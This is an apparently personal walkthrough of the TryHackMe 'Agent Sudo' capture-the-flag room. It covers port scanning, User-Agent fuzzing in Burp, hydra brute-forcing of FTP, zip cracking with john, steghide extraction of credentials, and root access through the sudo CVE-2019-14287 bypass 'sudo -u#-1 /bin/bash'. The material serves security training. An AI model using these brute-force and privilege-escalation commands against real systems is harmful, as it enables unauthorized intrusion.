```bash
# PLATFORM          . THM
# CTF NAME          . Agent Sudo
# DESCRIPTION       . You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/agentsudoctf
```

```bash
sudo nmap -sSVC -T5 10.10.132.55 -p- -oN agentsudo
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- If we navigate to the webserver on port `80`, all we get is 

```
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R
```

- This makes me think that we neeed to capture the request in burp suite and change the user-agent to a valid value.

- I've captured the request and sent it to Intruder.

- I've created a payload containing all uppercase letters A-Z and started a `sniper` attack.

```
GET / HTTP/1.1
Host: 10.10.132.55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: §<A-Z>§
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- All requests besides agent `R` and `C` had the same `status code` and `length` so I've considered those obsolete.

- If we modify the User-Agent to `R`, we get a warning. However, this confirms us that we're on the right track and using the right format. 

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

- If we switch the user-agent to `C`, we see that burp captures another request

```
GET /agent_C_attention.php 
```

- The page is loaded and here's the content

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```

- We get our username, `chris`, along with some indication that the password might be easy to bruteforce.

- Let's try bruteforcing `ftp` first.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.132.55 ftp
```

```
[21][ftp] host: 10.10.132.55   login: chris   password: crystal
```

- After logging in to `ftp`, we're able to find some files.

```bash
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

```To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

- This reveals that here's a steganography challenge and that the password of `Agent J` is hidden inside one of the pictures. 

- Running `steghide --extract -sf` against `cute-alien.jpg` asks for a passphrase, so I've moved to other checks for now.

- I've installed `binwalk` and used `binwalk -e` against both images. 

```bash

binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

- The `.zip` archive seems to be password protected, so we can make use of `john` to try to crack this.

- First, use `zip2john` to extract the hash from the `.zip` file

```bash
/opt/john/run/zip2john 8702.zip > zip_hash.txt
```

- Then, use `john` to crack the password. I've used the classic `rockyou.txt` file.

```bash
/opt/john/run/john -w=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

>**NOTE**: A **COMPILED** version of `john` is needed ; I had the `jumbo` version installed from the official website / git clone of the `run` directory and it was missing some extensions, including `zip2john`.

- I tried `unziping` the arhive using `unzip -P [password] [filename]`

```
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```

- So I managed to get the file using `7z` instead

```
7z x 8702.zip -p[passowrd]
```

```To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

- I've tried using `QXJlYTUx` as the passphrase asked when running `steghide --extract -sf cute-alien.jpg`, but it didn't work.

- It looks a bit like `base64` and using `echo "QXJlYTUx" | base64 -d` against the string reveals `Area51` in ASCII - that's the secret.

```
steghide --extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```

```message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

- So we've got ourselves a pair of credentials: `james:hackerrules!`

- `sudo -l` has an interesting output, but let's focus on getting the 1st flag first.

```bash
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

- First flag is located at `/home/james/user_flag.txt` alongside a `jpg` called `Alien_autospy.jpg`. 

- I've transferred the file to my box using `scp`

```bash
scp james@10.10.132.55:/home/james/Alien_autospy.jpg alien_autopsy.jpg
```

- well. a dead alien. now what? I had no clue what to do with this.

- `steghide --extract -sf` asks for a passphase, but I got no clue and I don't think bruteforcing this is the way to go.

- I've checked the hint and it says that we need to google about it.

- Here we go: The incident is called "Roswell Alien Autopsy". 

- Back to our victim box - we need to escalate privileges.

- The CTF is asking for the CVE number we'll use to exploit, so it is basically a hint that we need to find a vulnerability that can be leveraged in this environment.

```bash
james@agent-sudo:~$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
```

```bash
james@agent-sudo:~$ uname -a
Linux agent-sudo 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

- I think I spent 2 hours looking for 4.1x Kernel exploits. 

- However, I've checked the `sudo version` using `sudo -V` and I was able to find an exploit that can be leveraged on this box.

```bash
sudo -V

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

- The exploit can be found here:[CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) and it specifies that in order to bypass `(ALL, !root) /bin/bash`, all we need to do is to run `sudo -u#-1 /bin/bash` instead.

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
```

- This exploit works by using `sudo -u` (-u = specify user UID) with a negative value. Sudo doesn't check to see if the UID exists and it returns 0 when given an invalid value, 0 being the root UID and granting us root permissions instead.

- Last flag is in `/root/root.txt`

